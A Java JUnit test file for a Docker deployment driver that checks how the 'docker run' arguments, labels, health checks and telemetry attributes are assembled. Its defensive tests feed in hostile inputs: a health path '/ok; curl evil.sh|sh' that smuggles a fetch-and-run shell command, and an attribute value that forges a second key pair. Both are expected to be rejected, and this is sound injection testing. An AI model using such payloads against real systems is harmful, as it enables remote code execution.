package eu.wohlben.qits.cd.dockerhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.cd.control.DeploymentDriver;
import eu.wohlben.qits.cd.entity.CdDeploymentTarget;
import eu.wohlben.qits.cd.error.BadRequestException;
import io.smallrye.config.EnvConfigSource;
import io.smallrye.config.PropertiesConfigSource;
import io.smallrye.config.SmallRyeConfigBuilder;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * The {@code docker run} argv as assembled — plain JUnit over the package-private builder, the
 * {@code CiDaemonLauncherTest} stance: the argv IS the contract with the docker CLI, and asserting
 * it needs no docker.
 */
class DockerDeploymentDriverTest {

  private DockerDeploymentDriver driver() {
    return driver(Map.of());
  }

  private DockerDeploymentDriver driver(Map<String, String> properties) {
    DockerDeploymentDriver driver = new DockerDeploymentDriver();
    driver.runtime = "docker";
    driver.pullTimeoutSeconds = 600;
    driver.healthIntervalSeconds = 3;
    driver.healthRetries = 3;
    driver.healthStartPeriodSeconds = 10;
    driver.outputMaxChars = 65536;
    driver.config =
        new SmallRyeConfigBuilder()
            .withSources(new PropertiesConfigSource(properties, "test", 100))
            .build();
    return driver;
  }

  private DeploymentDriver.StartSpec spec(String healthPath) {
    return new DeploymentDriver.StartSpec(
        "env-id",
        "dev",
        "app-id",
        "qits-gateway",
        "dep-id",
        "abc1234",
        "qits-env-dev-qits-gateway",
        "qits-artifacts:8080/qits/qits-gateway:abc1234",
        "qits-cd-dev-qits-gateway-dep",
        healthPath,
        CdDeploymentTarget.ENVIRONMENT,
        true);
  }

  /** A platform-plane container: no environment at all, and qits-platform as its primary network. */
  private DeploymentDriver.StartSpec singletonSpec() {
    return new DeploymentDriver.StartSpec(
        null,
        null,
        "app-id",
        "qits-cd",
        "dep-id",
        "abc1234",
        "qits-platform",
        "qits-artifacts:8080/qits/qits-cd:abc1234",
        "qits-cd-singleton-qits-cd-dep",
        "/cd/q/health/ready",
        CdDeploymentTarget.SINGLETON,
        false);
  }

  @Test
  void theArgvCarriesNetworkAliasLabelsHealthGateAndRestartPolicy() {
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    assertEquals(List.of("docker", "run", "-d"), argv.subList(0, 3));
    assertTrue(argv.containsAll(List.of("--network", "qits-env-dev-qits-gateway")));
    assertTrue(argv.containsAll(List.of("--network-alias", "qits-gateway")));
    assertTrue(argv.containsAll(List.of("--restart", "unless-stopped")));
    assertTrue(argv.contains("qits.cd.environment=env-id"));
    assertTrue(argv.contains("qits.cd.application=app-id"));
    assertTrue(argv.contains("qits.cd.deployment=dep-id"));
    assertTrue(argv.contains("curl -fsS http://localhost:8080/q/health/ready || exit 1"));
    assertTrue(argv.containsAll(List.of("--health-interval", "3s")));
    assertTrue(argv.containsAll(List.of("--health-retries", "3")));
    assertTrue(argv.containsAll(List.of("--health-start-period", "10s")));
    assertTrue(argv.contains("QITS_ENVIRONMENT=dev"));
    assertTrue(argv.contains("QITS_APPLICATION=qits-gateway"));
    // The image is the last token: the entrypoint is the image's own, with no command appended.
    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
  }

  @Test
  void theArgvCarriesTheDeploymentsOtelResourceIdentity() {
    // The whole of workstream LD's first half: the container is told who it is, in OpenTelemetry's
    // own vocabulary, from values cd genuinely holds — the deployment's sha, the environment's
    // name, the container name cd just assigned. No invented version, no fake workspace ids.
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    String expected =
        "service.version=abc1234"
            + ",deployment.environment.name=dev"
            + ",service.instance.id=qits-cd-dev-qits-gateway-dep";
    assertTrue(argv.contains("OTEL_RESOURCE_ATTRIBUTES=" + expected));
    // The Quarkus-spelled twin carries the SAME string, and is what outranks the pom version
    // Quarkus bakes into the image as service.version at build time. Built once, so they cannot
    // drift apart.
    assertTrue(argv.contains("QUARKUS_OTEL_RESOURCE_ATTRIBUTES=" + expected));
  }

  @Test
  void theInjectedIdentityIsADefaultTheOperatorsRunArgsCanOverride() {
    // Precedence, and it is docker's rule rather than cd's: the LAST assignment of a repeated env
    // key is the one the container gets. cd's variables are written before run-args, so run-args
    // pass through untouched AND win — the injection composes with the operator instead of
    // fighting them.
    DockerDeploymentDriver driver =
        driver(
            Map.of(
                DockerDeploymentDriver.RUN_ARGS_PREFIX + "qits-gateway",
                "-v qits-data:/data -e OTEL_RESOURCE_ATTRIBUTES=service.version=operator"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    // The operator's arguments, verbatim and last before the image.
    assertEquals(
        List.of(
            "-v",
            "qits-data:/data",
            "-e",
            "OTEL_RESOURCE_ATTRIBUTES=service.version=operator",
            "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 5, argv.size()));
    // cd's own copy is still there, and it is EARLIER — which is what makes it the loser.
    int injected = argv.indexOf("OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
        + ",deployment.environment.name=dev"
        + ",service.instance.id=qits-cd-dev-qits-gateway-dep");
    assertTrue(injected > 0, "cd still writes its own default");
    assertTrue(injected < argv.indexOf("OTEL_RESOURCE_ATTRIBUTES=service.version=operator"));
  }

  @Test
  void aResourceAttributeValueCannotForgeASecondPair() {
    // The belt at the argv, the health-path stance. Nothing validated at the boundary can carry a
    // comma today; this is what turns a loosened boundary check into a failed deployment rather
    // than a container stamped with attributes cd never wrote.
    DeploymentDriver.StartSpec forged =
        new DeploymentDriver.StartSpec(
            "env-id",
            "dev,service.name=impostor",
            "app-id",
            "qits-gateway",
            "dep-id",
            "abc1234",
            "qits-env-dev-qits-gateway",
            "qits-artifacts:8080/qits/qits-gateway:abc1234",
            "qits-cd-dev-qits-gateway-dep",
            "/q/health/ready",
            CdDeploymentTarget.ENVIRONMENT,
            false);

    assertThrows(BadRequestException.class, () -> driver().buildArgv(forged));
  }

  @Test
  void runArgsAreAppendedBetweenCdsOwnFlagsAndTheImage() {
    DockerDeploymentDriver driver =
        driver(
            Map.of(
                DockerDeploymentDriver.RUN_ARGS_PREFIX + "qits-gateway",
                "-v qits-data:/data --env FOO=bar"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals(
        List.of(
            "-v",
            "qits-data:/data",
            "--env",
            "FOO=bar",
            "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 5, argv.size()));
  }

  @Test
  void runArgsOfAnotherApplicationDoNotLeakIn() {
    // The absence is the assertion that matters: only the deployed application's own key reaches
    // its argv, so one application's socket mount cannot ride along on a sibling's deployment.
    DockerDeploymentDriver driver =
        driver(
            Map.of(
                DockerDeploymentDriver.RUN_ARGS_PREFIX + "qits-workspaces",
                "-v /var/run/docker.sock:/var/run/docker.sock"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
    assertTrue(argv.stream().noneMatch(a -> a.contains("docker.sock")));
  }

  @Test
  void runArgsResolveFromTheEnvSpelling() {
    // The deployment sets QITS_CD_RUN_ARGS_QITS_GATEWAY in compose; this pins that SmallRye's
    // env mapping really answers the dashed property name the driver asks for.
    DockerDeploymentDriver driver = driver();
    driver.config =
        new SmallRyeConfigBuilder()
            .withSources(
                new EnvConfigSource(Map.of("QITS_CD_RUN_ARGS_QITS_GATEWAY", "--env FOO=bar"), 300))
            .build();

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals(
        List.of("--env", "FOO=bar", "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 3, argv.size()));
  }

  @Test
  void aliasHolderParsingMatchesByNameOrAliasAndStripsTheLeadingSlash() {
    // docker inspect emits /name; a container's own name resolves on the network, so name==alias
    // counts (the compose-seeded case) as does an explicit --network-alias (cd's own case).
    String output =
        "aaa111|/qits-gateway|qits-gateway abc\n"
            + "bbb222|/qits-cd-qits-qits-gateway-12345678|qits-gateway\n"
            + "ccc333|/unrelated|other-alias\n";
    List<DeploymentDriver.Holder> holders =
        DockerDeploymentDriver.parseHolders(output, "qits-gateway");
    assertEquals(
        List.of(
            new DeploymentDriver.Holder("aaa111", "qits-gateway"),
            new DeploymentDriver.Holder("bbb222", "qits-cd-qits-qits-gateway-12345678")),
        holders);
  }

  @Test
  void theRefereeArgvSwapsTheEntrypointMountsTheSocketAndCarriesTheArbitrationScript() {
    DockerDeploymentDriver driver = driver();
    driver.dockerSocketPath = "/var/run/docker.sock";
    DeploymentDriver.HandoffSpec spec =
        new DeploymentDriver.HandoffSpec(
            "qits-artifacts:8080/qits/qits-cd:abc",
            "old-full-id",
            "qits-cd-qits-qits-cd-12345678",
            120);
    String script = "docker stop old-full-id\n...";

    List<String> argv = driver.buildHandoffArgv(spec, script);

    assertEquals(List.of("docker", "run", "-d", "--rm"), argv.subList(0, 4));
    assertTrue(argv.containsAll(List.of("--name", "qits-cd-handoff-12345678")));
    assertTrue(argv.containsAll(List.of("-v", "/var/run/docker.sock:/var/run/docker.sock")));
    assertTrue(argv.containsAll(List.of("--entrypoint", "/bin/sh")));
    // The image is the deployment's own — just pulled, guaranteed present — then -c <script>.
    int image = argv.indexOf("qits-artifacts:8080/qits/qits-cd:abc");
    assertEquals("-c", argv.get(image + 1));
    assertEquals(script, argv.get(image + 2));
  }

  @Test
  void theArgvLabelsThePlaneAndTheAliasAReconciliationWillNeed() {
    // These three labels are what a LATER deploy reads: when it makes a per-application network it
    // has to find this environment's public nodes and every singleton, and join them under the
    // right alias. Without qits.cd.app-name the join would land under the deployment-suffixed
    // container name, which no peer has ever been told.
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    assertTrue(argv.contains("qits.cd.target=environment"));
    assertTrue(argv.contains("qits.cd.available-on-env=true"));
    assertTrue(argv.contains("qits.cd.app-name=qits-gateway"));
  }

  @Test
  void aSingletonCarriesNoEnvironmentLabelNoQitsEnvironmentAndIsPlatformToOtel() {
    // The absence of the environment label is the feature: an environment teardown reaps by it, and
    // a platform-plane container must never go down with a tier it merely serves. QITS_ENVIRONMENT
    // is absent for the same reason — a singleton is not in an environment — and OTel is told the
    // one true thing instead.
    List<String> argv = driver().buildArgv(singletonSpec());

    assertTrue(argv.stream().noneMatch(a -> a.startsWith("qits.cd.environment=")));
    assertTrue(argv.stream().noneMatch(a -> a.startsWith("QITS_ENVIRONMENT=")));
    assertTrue(argv.contains("qits.cd.target=singleton"));
    assertTrue(argv.contains("qits.cd.available-on-env=false"));
    assertTrue(argv.containsAll(List.of("--network", "qits-platform")));
    assertTrue(argv.containsAll(List.of("--network-alias", "qits-cd")));
    assertTrue(
        argv.contains(
            "OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
                + ",deployment.environment.name=platform"
                + ",service.instance.id=qits-cd-singleton-qits-cd-dep"));
  }

  @Test
  void aCreatedNetworkCarriesTheLabelsEveryLaterLookupUsesToFindIt() {
    List<String> argv =
        driver()
            .buildNetworkCreateArgv(
                new DeploymentDriver.Network(
                    "qits-env-dev-qits-gateway",
                    "env-id",
                    DeploymentDriver.NetworkKind.APPLICATION,
                    "qits-gateway"));

    assertEquals(List.of("docker", "network", "create"), argv.subList(0, 3));
    assertTrue(argv.contains("qits.cd.network=application"));
    assertTrue(argv.contains("qits.cd.environment=env-id"));
    assertTrue(argv.contains("qits.cd.app-name=qits-gateway"));
    assertEquals("qits-env-dev-qits-gateway", argv.get(argv.size() - 1));

    // The platform network belongs to no environment and to no application, and says so by leaving
    // both labels off rather than by writing an empty one.
    List<String> platform =
        driver()
            .buildNetworkCreateArgv(
                new DeploymentDriver.Network(
                    "qits-platform", null, DeploymentDriver.NetworkKind.PLATFORM, null));
    assertTrue(platform.contains("qits.cd.network=platform"));
    assertTrue(platform.stream().noneMatch(a -> a.startsWith("qits.cd.environment=")));
    assertTrue(platform.stream().noneMatch(a -> a.startsWith("qits.cd.app-name=")));
  }

  @Test
  void networkListingReadsTheLabelsBackAndSkipsWhatIsNotCds() {
    String output =
        "qits-env-dev-qits-gateway|qits.cd.network=application,qits.cd.environment=env-1,"
            + "qits.cd.app-name=qits-gateway\n"
            + "qits-net|qits.cd.network=bundle,qits.cd.environment=env-1\n"
            + "qits-platform|qits.cd.network=platform\n"
            + "someone-elses|com.docker.compose.project=x\n";

    List<DeploymentDriver.Network> networks = DockerDeploymentDriver.parseNetworks(output);

    assertEquals(
        List.of(
            new DeploymentDriver.Network(
                "qits-env-dev-qits-gateway",
                "env-1",
                DeploymentDriver.NetworkKind.APPLICATION,
                "qits-gateway"),
            new DeploymentDriver.Network(
                "qits-net", "env-1", DeploymentDriver.NetworkKind.BUNDLE, null),
            new DeploymentDriver.Network(
                "qits-platform", null, DeploymentDriver.NetworkKind.PLATFORM, null)),
        networks);
  }

  @Test
  void aReconciliationCandidateWithoutAnAppNameLabelIsSkipped() {
    // A container from before this label existed cannot be joined under the right alias, so it is
    // left alone rather than joined under a name nothing resolves. Its own next deploy fixes it.
    List<DeploymentDriver.Endpoint> endpoints =
        DockerDeploymentDriver.parseEndpoints("aaa111|qits-gateway\nbbb222|\nccc333|qits-cd\n");

    assertEquals(
        List.of(
            new DeploymentDriver.Endpoint("aaa111", "qits-gateway"),
            new DeploymentDriver.Endpoint("ccc333", "qits-cd")),
        endpoints);
  }

  @Test
  void aHostileHealthPathCannotReachTheShellString() {
    // Belt on top of the boundary's braces: the one value interpolated into a string a shell will
    // run is re-validated at the last line before the argv.
    assertThrows(
        BadRequestException.class, () -> driver().buildArgv(spec("/ok; curl evil.sh|sh")));
  }
}
